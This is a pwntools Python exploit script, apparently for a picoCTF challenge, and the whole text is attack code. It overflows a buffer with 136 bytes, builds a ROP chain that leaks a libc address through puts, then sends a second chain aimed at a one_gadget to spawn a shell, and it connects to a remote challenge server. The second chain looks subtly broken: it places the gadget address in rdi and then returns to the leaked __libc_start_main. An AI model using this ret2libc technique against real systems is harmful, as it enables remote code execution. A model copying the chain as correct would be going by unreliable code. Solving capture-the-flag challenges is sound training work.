#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

gdbscript = '''
b *0x400913
continue
'''.format(**locals())

def conn():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    elif args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
            print("attaching")
    else:
        r = remote("mercury.picoctf.net", 23584)

    return r


def main():
    p = conn()
    PUTS = exe.plt['puts']
    MAIN = exe.symbols['main']
    rop = ROP(exe)
    LIBC_START_MAIN = exe.symbols['__libc_start_main']

    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    RET = (rop.find_gadget(['ret']))[0]

    log.info("puts@plt: " + hex(PUTS))
    log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
    log.info("pop rdi gadget: " + hex(POP_RDI))

    #create the first rop chain to leak libc address
    JUNK = ("A"*136).encode()
    rop = JUNK
    rop += p64(POP_RDI)
    rop += p64(LIBC_START_MAIN)
    rop += p64(PUTS)
    rop += p64(MAIN)

    p.sendlineafter("sErVeR!", rop)

    p.recvline()
    p.recvline()

    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


    libc.address = leak - libc.sym["__libc_start_main"]
    log.info("Address of libc %s " % hex(libc.address))

    #second rop chain to jump to /bin/sh
    rop2 = JUNK
    rop2 += p64(RET)
    rop2 += p64(POP_RDI)
    rop2 += p64(libc.address + 0x10a45c)

    #found by using one_gadget /bin/sh
    #0x4f365
    #0x4f3c2
    #0x10a45c

    rop2 += p64(leak)

    p.sendlineafter("sErVeR!", rop2)

    p.interactive()


if __name__ == "__main__":
    main()
